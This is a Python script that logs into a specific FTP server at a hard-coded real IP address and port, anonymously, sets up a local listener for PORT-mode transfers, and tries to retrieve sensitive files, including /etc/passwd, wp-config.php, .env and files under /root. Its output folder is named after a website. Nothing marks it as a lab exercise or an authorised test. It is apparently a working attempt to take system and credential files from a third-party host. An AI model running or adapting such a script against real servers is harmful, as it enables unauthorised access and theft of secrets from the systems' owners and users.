#!/usr/bin/env python3
"""FTP PORT mode download attempt."""
import ftplib
import socket
import threading
import time
import os

HOST = "103.160.107.175"
PORT = 6969
LISTEN_PORT = 8888
OUTDIR = "/home/ubuntu/iptvgear.site"

# Get our IP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
OUR_IP = s.getsockname()[0]
s.close()
print(f"Our IP: {OUR_IP}")

# Parse IP for PORT command
ip_parts = OUR_IP.split(".")
port_p1 = LISTEN_PORT // 256
port_p2 = LISTEN_PORT % 256
port_cmd = f"PORT {','.join(ip_parts)},{port_p1},{port_p2}"
print(f"PORT cmd: {port_cmd}")

def listener():
    """Listen for FTP data connection."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", LISTEN_PORT))
    srv.listen(1)
    srv.settimeout(30)
    print(f"Listening on port {LISTEN_PORT}...")
    try:
        conn, addr = srv.accept()
        print(f"Connection from {addr}")
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        conn.close()
        srv.close()
        return data
    except socket.timeout:
        print("Listener timeout")
        srv.close()
        return b""
    except Exception as e:
        print(f"Listener error: {e}")
        srv.close()
        return b""

# Start listener thread
lt = threading.Thread(target=listener, daemon=True)
lt.start()
time.sleep(0.5)

# Connect FTP and try PORT mode download
print(f"\nConnecting to {HOST}:{PORT}...")
ftp = ftplib.FTP()
ftp.connect(HOST, PORT, timeout=15)
ftp.login("anonymous", "anonymous@test.com")
print(f"Logged in. PWD: {ftp.pwd()}")

# Try PORT
try:
    resp = ftp.sendcmd(port_cmd)
    print(f"PORT response: {resp}")
except Exception as e:
    print(f"PORT error: {e}")

# List files to download
# Let's try a few paths
files_to_try = [
    "/etc/passwd",
    "wp-config.php",
    ".env",
    "/root/wp-config.php",
    "/root/FTP-shared/",
    "/root/root/",
]

for f in files_to_try:
    print(f"\n--- Trying RETR {f} ---")
    try:
        resp = ftp.sendcmd(f"RETR {f}")
        print(f"RETR response: {resp}")
        # Wait for data
        time.sleep(3)
    except Exception as e:
        print(f"RETR error: {e}")

# Try LIST via PORT
print("\n--- Trying LIST via PORT ---")
try:
    # Need raw socket for LIST
    ftp.sock.settimeout(30)
    resp = ftp.sendcmd("LIST")
    print(f"LIST response: {resp}")
    time.sleep(3)
except Exception as e:
    print(f"LIST error: {e}")

ftp.quit()

# Wait for listener
lt.join(timeout=10)